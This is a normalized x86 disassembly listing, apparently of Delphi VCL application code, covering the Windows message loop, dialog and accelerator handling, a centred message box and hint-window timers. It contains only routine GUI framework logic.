push esi
call SetForegroundWindow
sub_459d40
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ea8
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_403f44
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_459d8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_459db0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_459e00
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_4371d8
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_440b28
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_459eb8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_45ae18
sub_459eec
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_440b28
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403300
test al al
jne r-xdata
sub_459f58
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_459eb8
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_459db0
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_459e00
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_459d8c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_459ff0
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_459f58
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_45a8c0
sub_45a014
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413d4c
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_413c10
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_45a070
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413d6c
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413c5c
jmp r-xdata
sub_45a104
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_45a142
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_440b04
mov [ esi + 0x44 ] edi
sub_45a184
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_45a262
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_451094
call sub_4079f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a269
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_454878
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_45a229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_459ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_453780
mov eax [ ebp - 0x4 ]
call sub_459b54
jmp r-xdata
sub_45a284
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b458
call sub_40274c
mov edx [ rw-data ]
call sub_403290
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_45a47c
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_45a314
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45111c
mov [ ebp - 0x10 ] eax
call sub_451038
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4592b8
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_45a469
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a470
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4511d0
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_451040
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_45a47c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a537
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403eec
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_459d40
mov eax [ ebp - 0x108 ]
call sub_404314
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
mov edx eax
mov eax ebx
pop ecx
call sub_45a314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a53e
lea eax [ ebp - 0x108 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
call sub_408354
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c0c
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a24
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40411c
sub_45a554
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_440cc4
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_440e2c
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45abf8
test al al
je r-xdata
call sub_440b28
mov ebp eax
mov eax edi
call sub_440b28
mov ebp eax
mov eax esi
call sub_45abf8
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45a6bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45a714
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45abf8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b444
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a71b
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45a724
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45a77c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45abf8
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b444
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a783
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45a794
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403104
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43a4ec
jmp r-xdata
sub_45a7e4
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_457d90
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_440b28
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457d7c
mov ebx eax
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax ebx
call sub_440b28
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45a848
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_438bf8
mov edi eax
call sub_4374f4
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43b4f4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43b4f4
sub_45a8c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a9d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45a848
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4588f8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43745c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45aa80
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45a977
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45ae18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a7e4
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4196b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a9d7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45a9e0
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_457d74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_457d60
movzx edx di
xor ecx ecx
call sub_43b4f4
inc esi
dec ebx
jne r-xdata
sub_45aa1c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_459b38
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_459b38
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45a9e0
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45aa80
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404260
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ea8
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434068
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446d58
xor eax eax
push ebp
push sub_45ab05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403104
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45ab14
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45ab70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_457d74
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45ab14
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457d60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45ab14
pop ecx
jmp r-xdata
mov eax ebx
call sub_440e2c
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_440b28
push eax
call IsChild
test eax eax
jne r-xdata
sub_45abf8
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054f4
call sub_4250b4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45ac20
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45ac64
push sub_458950
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45ae18
sub_45ac8c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_40682c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_439e64
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_438bf8
call sub_458930
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45ae18
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_40682c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_439e64
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45ae18
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45ac20
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43b4f4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45b0b0
jmp r-xdata
sub_45ad9c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45ac64
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45b0b0
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45add4
jmp r-xdata
sub_45add4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440e2c
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_440b28
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_440b28
push eax
call ShowWindow
sub_45ae18
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45add4
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_458ab8
mov eax ebx
call sub_45ac64
sub_45ae50
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45af92
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41eddc
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4079a4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45af63
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41ee94
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af6a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45ae40
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
